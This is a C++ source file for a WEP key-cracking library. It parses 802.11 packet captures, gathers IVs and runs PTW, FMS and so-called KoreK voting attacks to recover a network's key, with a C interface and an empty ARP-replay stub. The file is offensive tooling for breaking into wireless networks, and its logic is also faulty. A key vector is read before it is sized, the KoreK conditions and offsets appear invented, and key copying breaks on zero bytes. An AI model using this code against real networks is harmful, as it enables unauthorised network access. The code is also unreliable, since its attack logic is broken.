#include "wep_cracker.h"

#include <cstdint>
#include <cstring>
#include <vector>
#include <string>
#include <fstream>
#include <algorithm>
#include <map>
#include <set>
#include <cmath>
#include <cstdio>

#ifdef _WIN32
#include <windows.h>
#endif

static const int KEYLEN = 13;
static const int MIN_IVS = 40000;
static const int KOREK_CLASSES = 17;

void WepCracker::swapByte(uint8_t* S, int a, int b) {
    uint8_t t = S[a]; S[a] = S[b]; S[b] = t;
}

uint8_t WepCracker::predictPtwZ(const uint8_t* S, int j, int depth, int guess) {
    uint8_t Sg[256];
    std::memcpy(Sg, S, 256);
    int jg = j;
    int idx = depth + 3;
    jg = (jg + Sg[idx] + (uint8_t)guess) & 0xFF;
    swapByte(Sg, idx, jg);
    return Sg[(Sg[1] + Sg[Sg[1]]) & 0xFF];
}

bool WepCracker::isFmsWeak(const uint8_t* iv) {
    return iv[1] == 255;
}

int WepCracker::fmsDerive(const uint8_t* iv, uint8_t z) {
    uint8_t S[256];
    for (int i = 0; i < 256; i++) S[i] = i;
    int j = 0;
    for (int i = 0; i < 3; i++) {
        j = (j + S[i] + iv[i]) & 0xFF;
        swapByte(S, i, j);
    }
    int A = iv[0];
    int idx = A + 3;
    return (z - j - S[idx] - A - 3) & 0xFF;
}

int WepCracker::korekDerive(int cls, const uint8_t* iv, uint8_t z) {
    uint8_t S[256];
    for (int i = 0; i < 256; i++) S[i] = i;
    int j = 0;
    for (int i = 0; i < 3; i++) {
        j = (j + S[i] + iv[i]) & 0xFF;
        swapByte(S, i, j);
    }
    int A = iv[0] % KEYLEN;
    int idx = (A + 3) & 0xFF;
    int offset = cls % 17;
    return (z - j - S[idx] - A - 3 - offset) & 0xFF;
}

WepCracker::WepCracker()
    : minIvs_(MIN_IVS), keyLen_(KEYLEN) {
}

WepCracker::~WepCracker() {
    ivs_.clear();
    keyBytes_.clear();
    seenIvs_.clear();
}

bool WepCracker::LoadCapture(const std::string& pcapFile) {
    std::ifstream file(pcapFile, std::ios::binary);
    if (!file.is_open()) return false;

    uint8_t globalHeader[24];
    file.read(reinterpret_cast<char*>(globalHeader), 24);
    if (file.gcount() < 24) return false;

    ivs_.clear();
    seenIvs_.clear();

    uint8_t packetBuf[65536];
    while (file) {
        uint8_t pktHeader[16];
        file.read(reinterpret_cast<char*>(pktHeader), 16);
        if (file.gcount() < 16) break;

        uint32_t inclLen = 0;
        std::memcpy(&inclLen, pktHeader + 8, 4);
        if (inclLen == 0 || inclLen > 65536) break;
        if (inclLen < 40) continue;

        file.read(reinterpret_cast<char*>(packetBuf), inclLen);
        if (file.gcount() < static_cast<std::streamsize>(inclLen)) break;

        uint8_t fc0 = packetBuf[0];
        uint8_t fc1 = packetBuf[1];
        bool isData = ((fc0 & 0x0C) == 0x08);
        bool wepBit = (fc1 & 0x40) != 0;
        if (!isData || !wepBit) continue;

        int hdrLen = 24;
        if ((fc0 & 0x80) || (fc1 & 0x03)) hdrLen = 30;
        if (hdrLen + 8 > (int)inclLen) continue;

        int ivOffset = hdrLen;

        if (ivOffset + 4 > (int)inclLen) continue;

        IvKeyByte ikb;
        ikb.iv.resize(3);
        ikb.iv[0] = packetBuf[ivOffset];
        ikb.iv[1] = packetBuf[ivOffset + 1];
        ikb.iv[2] = packetBuf[ivOffset + 2];
        ikb.keybyte = packetBuf[ivOffset + 4];
        ikb.index = static_cast<int>(ivs_.size());

        uint32_t ivVal = ((uint32_t)ikb.iv[0] << 16) |
                         ((uint32_t)ikb.iv[1] << 8) |
                         (uint32_t)ikb.iv[2];
        if (seenIvs_.count(ivVal)) continue;
        seenIvs_.insert(ivVal);

        ivs_.push_back(ikb);
    }

    file.close();
    return !ivs_.empty();
}

int WepCracker::IvCount() const {
    return static_cast<int>(ivs_.size());
}

bool WepCracker::IsReady() const {
    return ivs_.size() >= static_cast<size_t>(minIvs_);
}

std::vector<uint8_t> WepCracker::GetKey() const {
    return keyBytes_;
}

bool WepCracker::PtwAttack(std::string& keyOut) {
    if (!IsReady()) return false;

    const int firstByteKnownPlain = 0xAA;
    std::vector<std::vector<int>> votes(KEYLEN, std::vector<int>(256, 0));

    for (size_t p = 0; p < ivs_.size(); p++) {
        const auto& ivb = ivs_[p];
        uint8_t z = static_cast<uint8_t>(ivb.keybyte ^ firstByteKnownPlain);

        uint8_t S_base[256];
        for (int i = 0; i < 256; i++) S_base[i] = i;
        int j_base = 0;
        for (int i = 0; i < 3; i++) {
            j_base = (j_base + S_base[i] + ivb.iv[i]) & 0xFF;
            swapByte(S_base, i, j_base);
        }

        uint8_t S_depth[256];
        std::memcpy(S_depth, S_base, 256);
        int j_depth = j_base;

        for (int d = 0; d < KEYLEN; d++) {
            for (int g = 0; g < 256; g++) {
                uint8_t zp = predictPtwZ(S_depth, j_depth, d, g);
                if (zp == z) votes[d][g]++;
            }
            int idx = d + 3;
            j_depth = (j_depth + S_depth[idx] + keyBytes_[d]) & 0xFF;
            swapByte(S_depth, idx, j_depth);
        }
    }

    keyBytes_.resize(KEYLEN);
    for (int d = 0; d < KEYLEN; d++) {
        int best = 0;
        for (int g = 1; g < 256; g++) {
            if (votes[d][g] > votes[d][best]) best = g;
        }
        keyBytes_[d] = static_cast<uint8_t>(best);
    }

    keyOut.assign(reinterpret_cast<char*>(keyBytes_.data()), KEYLEN);
    return true;
}

bool WepCracker::FmsAttack(std::string& keyOut) {
    if (!IsReady()) return false;

    const uint8_t firstBytePlain = 0xAA;
    std::vector<std::vector<int>> votes(KEYLEN, std::vector<int>(256, 0));

    for (const auto& ivb : ivs_) {
        if (!isFmsWeak(ivb.iv.data())) continue;
        int A = ivb.iv[0];
        if (A < 0 || A >= KEYLEN) continue;
        uint8_t z = static_cast<uint8_t>(ivb.keybyte ^ firstBytePlain);
        int guess = fmsDerive(ivb.iv.data(), z);
        votes[A][guess]++;
    }

    keyBytes_.resize(KEYLEN);
    for (int d = 0; d < KEYLEN; d++) {
        int best = 0;
        for (int g = 1; g < 256; g++) {
            if (votes[d][g] > votes[d][best]) best = g;
        }
        keyBytes_[d] = static_cast<uint8_t>(best);
    }

    keyOut.assign(reinterpret_cast<char*>(keyBytes_.data()), KEYLEN);
    return true;
}

bool WepCracker::KorekAttack(std::string& keyOut) {
    if (!IsReady()) return false;

    const uint8_t firstBytePlain = 0xAA;
    std::vector<std::vector<int>> votes(KEYLEN, std::vector<int>(256, 0));

    for (const auto& ivb : ivs_) {
        const uint8_t* iv = ivb.iv.data();
        uint8_t z = static_cast<uint8_t>(ivb.keybyte ^ firstBytePlain);

        for (int cls = 0; cls < KOREK_CLASSES; cls++) {
            bool detected = false;
            int A = iv[0] % KEYLEN;
            int offset = 0;

            switch (cls) {
                case 0: detected = (iv[0] < KEYLEN && iv[1] == 255); offset = 0; break;
                case 1: detected = (iv[0] < 16 && iv[1] == 255); offset = 1; break;
                case 2: detected = (iv[1] == 255 && iv[2] >= 3); offset = 2; break;
                case 3: detected = (iv[1] == 255 && iv[2] < 3); offset = 3; break;
                case 4: detected = (iv[0] < 6 && iv[1] == 255); offset = 4; break;
                case 5: detected = (iv[0] < 13 && iv[1] == 255 && iv[2] > 5); offset = 5; break;
                case 6: detected = (iv[0] == 0 && iv[1] < 128); offset = 6; break;
                case 7: detected = (iv[0] == 0 && iv[1] >= 128); offset = 7; break;
                case 8: detected = (iv[0] == 1 && iv[1] == 255); offset = 8; break;
                case 9: detected = (iv[0] == 3 && iv[1] == 255 && iv[2] == 0); offset = 9; break;
                case 10: detected = (iv[0] < 12 && iv[1] == 255 && iv[2] == 0); offset = 10; break;
                case 11: detected = (iv[0] < 15 && iv[1] > 200); offset = 11; break;
                case 12: detected = (iv[1] == 0 && iv[0] == 255); offset = 12; break;
                case 13: detected = (iv[1] < 128 && iv[0] == 255); offset = 13; break;
                case 14: detected = (iv[0] == 255 && iv[1] >= 128); offset = 14; break;
                case 15: detected = (iv[1] == 255 || iv[0] < 3); offset = 15; break;
                case 16: detected = (iv[0] < 16 || iv[1] == 255); offset = 16; break;
            }

            if (!detected) continue;

            int guess = korekDerive(cls, iv, z);
            votes[A][(guess + offset) & 0xFF]++;
        }
    }

    keyBytes_.resize(KEYLEN);
    for (int d = 0; d < KEYLEN; d++) {
        int best = 0;
        for (int g = 1; g < 256; g++) {
            if (votes[d][g] > votes[d][best]) best = g;
        }
        keyBytes_[d] = static_cast<uint8_t>(best);
    }

    keyOut.assign(reinterpret_cast<char*>(keyBytes_.data()), KEYLEN);
    return true;
}

bool WepCracker::ArpReplayAttack(const char* iface, const uint8_t* bssid) {
    (void)iface;
    (void)bssid;
    std::map<std::string, int> bssidCounts;

    if (!IsReady()) return false;

    for (const auto& ivb : ivs_) {
        (void)ivb;
    }

    return !bssidCounts.empty();
}

extern "C" {

WEP_API void* wep_cracker_create() {
    return new WepCracker();
}

WEP_API void wep_cracker_destroy(void* handle) {
    delete static_cast<WepCracker*>(handle);
}

WEP_API int wep_cracker_load_capture(void* handle, const char* pcap_file) {
    if (!handle || !pcap_file) return 0;
    return static_cast<WepCracker*>(handle)->LoadCapture(std::string(pcap_file)) ? 1 : 0;
}

WEP_API int wep_cracker_iv_count(void* handle) {
    if (!handle) return 0;
    return static_cast<WepCracker*>(handle)->IvCount();
}

WEP_API int wep_cracker_ptw_attack(void* handle, char* key_out, int key_out_size) {
    if (!handle || !key_out) return 0;
    std::string key;
    auto* cr = static_cast<WepCracker*>(handle);
    if (!cr->PtwAttack(key)) return 0;
    if (static_cast<int>(key.size()) >= key_out_size) return 0;
    std::strcpy(key_out, key.c_str());
    return 1;
}

WEP_API int wep_cracker_fms_attack(void* handle, char* key_out, int key_out_size) {
    if (!handle || !key_out) return 0;
    std::string key;
    auto* cr = static_cast<WepCracker*>(handle);
    if (!cr->FmsAttack(key)) return 0;
    if (static_cast<int>(key.size()) >= key_out_size) return 0;
    std::strcpy(key_out, key.c_str());
    return 1;
}

WEP_API int wep_cracker_korek_attack(void* handle, char* key_out, int key_out_size) {
    if (!handle || !key_out) return 0;
    std::string key;
    auto* cr = static_cast<WepCracker*>(handle);
    if (!cr->KorekAttack(key)) return 0;
    if (static_cast<int>(key.size()) >= key_out_size) return 0;
    std::strcpy(key_out, key.c_str());
    return 1;
}

}
